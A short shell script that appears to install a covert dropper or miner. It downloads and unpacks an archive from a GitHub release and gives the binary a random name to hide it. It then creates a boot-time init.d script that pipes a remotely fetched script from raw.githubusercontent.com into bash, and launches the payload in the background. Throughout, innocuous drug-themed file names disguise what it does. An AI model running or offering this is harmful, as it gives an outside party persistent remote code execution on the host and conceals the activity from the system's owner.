cd /
wget https://github.com/embedec/zantac/releases/download/v0.0.3/vistaril.tar
tar -xvf vistaril.tar
cd /vistaril
variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
mv doxycy $variable1
sed -i "s/oodo/${variable1} -t=500 -n=${variable1}/g" ./penici.sh
cd /etc/init.d
echo "bash <(curl -s -L https://raw.githubusercontent.com/embedec/zantac/main/cyclo.sh)" > morphine.sh
chmod a+x morphine.sh
update-rc.d morphine.sh defaults
rm -rf vistaril.tar
cd /vistaril
nohup ./penici.sh
ps -ef | grep vistaril
